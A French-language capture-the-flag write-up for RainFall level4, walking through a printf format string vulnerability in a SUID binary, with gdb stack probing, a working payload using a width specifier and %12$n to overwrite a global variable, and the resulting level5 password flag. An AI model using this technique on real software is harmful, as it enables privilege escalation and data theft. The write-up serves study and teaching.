# RainFall CTF - Level4

## Reconnaissance

### Fichier trouvé
```bash
level4@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level5 users 5403 Mar  6  2016 level4
```

**Observations :**
- Exécutable avec SUID bit activé (`s` dans les permissions)
- Appartient à `level5` (propriétaire) et `users` (groupe)
- Peut être exécuté avec les privilèges de `level5`

## Analyse statique avec Ghidra

### Fonction main
```c
void main(void) {
  n();
  return;
}
```

### Fonction n (principale)
```c
void n(void) {
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}
```

### Fonction p (vulnérable)
```c
void p(char *param_1) {
  printf(param_1);    // ← VULNÉRABILITÉ FORMAT STRING
  return;
}
```

## Analyse des vulnérabilités

### Format String Vulnerability
- **Fonction dangereuse** : `printf(param_1)` dans la fonction `p()`
- **Problème** : Input utilisateur passé directement comme format string
- **Impact** : Contrôle total des spécificateurs de format

### Condition de victoire
```c
if (m == 0x1025544) {  // Si m vaut 16930116 en décimal
    system("/bin/cat /home/user/level5/.pass");
}
```

Il faut modifier la variable globale `m` pour qu'elle vaille `0x1025544` (16930116 en décimal).

## Reconnaissance de la variable m

### Conversion hexadécimal → décimal
- **Valeur cible** : `0x1025544` = `16930116` en décimal
- **Valeur actuelle** : `m = 0`

### Localisation avec GDB
```bash
gdb ./level4
(gdb) b main
(gdb) info variables    # Affiche l'adresse de m
```

**Résultat** : Variable `m` située à l'adresse `0x08049810`

```bash
(gdb) p m              # Affiche m = 0
```

## Test de localisation sur la pile

```bash
python -c "print('\x10\x98\x04\x08' + '0x%x ' * 20)" | ./level4
```

**Sortie :**
```
0xb7ff26b0 0xbffff794 0xb7fd0ff4 0x0 0x0 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x8049810 0x78257830 0x25783020 ...
```

L'adresse `0x8049810` (variable `m`) apparaît à la **12ème position** sur la pile.

## Problématique de la taille

### Approche naïve (échec)
```bash
(python -c "print('\x10\x98\x04\x08' + 'A' * (16930116 - 4) + '%12\$n')"; cat) | ./level4
```

**Problème** : Générer 16 930 112 caractères cause :
- Consommation excessive de mémoire
- Temps d'exécution très long
- Erreur "Broken pipe"

### Solution optimisée : Spécificateur de largeur

Au lieu de générer des millions de caractères, utiliser les capacités de `printf` :

## Mécanisme des spécificateurs de largeur

### Principe
`%16930112x` dit à `printf` :
- Affiche une valeur en hexadécimal
- Assure-toi que l'affichage total fasse **16930112 caractères**
- Ajoute des espaces à gauche si nécessaire

### Exemples
```c
printf("%10x", 255);    // Affiche "       ff" (8 espaces + "ff" = 10 chars)
printf("%5x", 255);     // Affiche "   ff" (3 espaces + "ff" = 5 chars)
```

### Avantage
- `printf` génère automatiquement le padding
- Pas besoin de créer une chaîne gigantesque en mémoire
- Beaucoup plus efficace

## Construction du payload

### Structure finale
1. **Adresse de m** : `\x10\x98\x04\x08` (4 octets)
2. **Spécificateur de largeur** : `%16930112x` (génère 16930112 caractères)
3. **Écriture mémoire** : `%12$n` (écrit le total à la 12ème position)

### Calcul
- Adresse : 4 caractères
- Largeur printf : 16930112 caractères
- **Total** : 16930116 caractères
- `%12$n` écrit cette valeur dans `m`

### Payload final
```bash
(python -c "print('\x10\x98\x04\x08' + '%16930112x' + '%12\$n')"; cat) | ./level4
```

## Séquence d'exécution

1. `fgets()` lit notre payload dans `local_20c`
2. `p(local_20c)` appelle `printf(local_20c)` avec notre format string
3. `printf()` exécute :
   - Affiche l'adresse `0x08049810`
   - `%16930112x` affiche une valeur hex sur 16930112 caractères
   - `%12$n` écrit le total (16930116) à l'adresse `m`
4. La condition `if (m == 0x1025544)` devient vraie
5. `system("/bin/cat /home/user/level5/.pass")` révèle le flag

## Exploitation réussie

```bash
level4@RainFall:~$ (python -c "print('\x10\x98\x04\x08' + '%16930112x' + '%12\$n')"; cat) | ./level4
[16930112 espaces]b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## Résultats

### Flag obtenu
```
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

### Accès niveau suivant
- **Utilisateur** : `level5`
- **Prochain challenge** : `/home/user/level5/`

## Notes techniques

- **Type de vulnérabilité** : Format String Vulnerability (niveau avancé)
- **Technique d'exploitation** : Écriture de valeur importante via `%n`
- **Optimisation** : Utilisation des spécificateurs de largeur pour éviter les gros payloads
- **Architecture** : x86 (32-bit)
- **Concepts avancés** :
  - Spécificateurs de largeur (`%Nx`)
  - Positional arguments (`%12$n`)
  - Calcul précis de caractères imprimés
- **Valeur cible** : 16930116 (0x1025544)
- **Difficulité** : Avancé - Optimisation des format strings

## Évolution par rapport au level3

Ce level introduit :
- **Valeurs plus importantes** à écrire (16M vs 64)
- **Optimisation nécessaire** des payloads
- **Spécificateurs de largeur** pour l'efficacité
- **Indirection** via fonction `p()`

Cette progression montre l'évolution des techniques d'exploitation format string vers des scénarios plus réalistes et complexes.